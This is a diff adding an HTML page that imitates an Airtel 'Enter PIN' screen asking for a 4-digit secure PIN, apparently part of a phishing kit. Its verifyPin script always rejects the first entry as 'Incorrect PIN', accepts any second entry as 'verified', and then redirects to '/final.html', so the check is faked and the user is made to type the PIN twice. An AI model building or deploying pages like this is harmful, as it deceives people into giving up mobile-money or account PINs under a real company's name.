@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter PIN</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #fff;
+}
+
+.container {
+    max-width: 420px;
+    margin: auto;
+    padding: 40px 20px;
+    text-align: center;
+}
+
+.back {
+    text-align: left;
+    font-size: 16px;
+    color: #444;
+    cursor: pointer;
+}
+
+h2 {
+    margin-top: 40px;
+}
+
+p {
+    color: #777;
+}
+
+.pin-box {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin: 40px 0;
+}
+
+.pin-box input {
+    width: 55px;
+    height: 55px;
+    border-radius: 12px;
+    border: 2px solid #ddd;
+    font-size: 24px;
+    text-align: center;
+}
+
+.pin-box input:focus {
+    border-color: #d32f2f;
+    outline: none;
+}
+
+.error {
+    color: red;
+    font-size: 14px;
+    display: none;
+}
+
+.success {
+    color: green;
+    font-size: 14px;
+    display: none;
+}
+
+.forgot {
+    color: #d32f2f;
+    margin-top: 20px;
+    font-weight: bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="back" onclick="history.back()">← Back</div>
+
+    <h2>Enter PIN</h2>
+    <p>Please enter your Airtel 4-digit secure PIN</p>
+
+    <div class="pin-box">
+        <input maxlength="1" inputmode="numeric" oninput="handleInput(this,0)">
+        <input maxlength="1" inputmode="numeric" oninput="handleInput(this,1)">
+        <input maxlength="1" inputmode="numeric" oninput="handleInput(this,2)">
+        <input maxlength="1" inputmode="numeric" oninput="handleInput(this,3)">
+    </div>
+
+    <div class="error" id="errorMsg">Incorrect PIN. Please try again.</div>
+    <div class="success" id="successMsg">PIN verified successfully ✔</div>
+
+    <div class="forgot">FORGOT PIN?</div>
+
+</div>
+
+<script>
+let attempts = 0;
+
+function handleInput(el, index) {
+    el.value = el.value.replace(/[^0-9]/g, '');
+
+    const inputs = document.querySelectorAll(".pin-box input");
+
+    if (el.value && index < 3) {
+        inputs[index + 1].focus();
+    }
+
+    checkPin();
+}
+
+function checkPin() {
+    const inputs = document.querySelectorAll(".pin-box input");
+    let pin = "";
+
+    inputs.forEach(i => pin += i.value);
+
+    if (pin.length === 4) {
+        verifyPin();
+    }
+}
+
+function verifyPin() {
+    attempts++;
+
+    if (attempts === 1) {
+        document.getElementById("errorMsg").style.display = "block";
+        document.getElementById("successMsg").style.display = "none";
+
+        document.querySelectorAll(".pin-box input").forEach(i => i.value = "");
+        document.querySelector(".pin-box input").focus();
+    } else {
+        document.getElementById("errorMsg").style.display = "none";
+        document.getElementById("successMsg").style.display = "block";
+
+        setTimeout(() => {
+            window.location.href = "/final.html";
+        }, 1500);
+    }
+}
+</script>
+
+</body>
+</html>
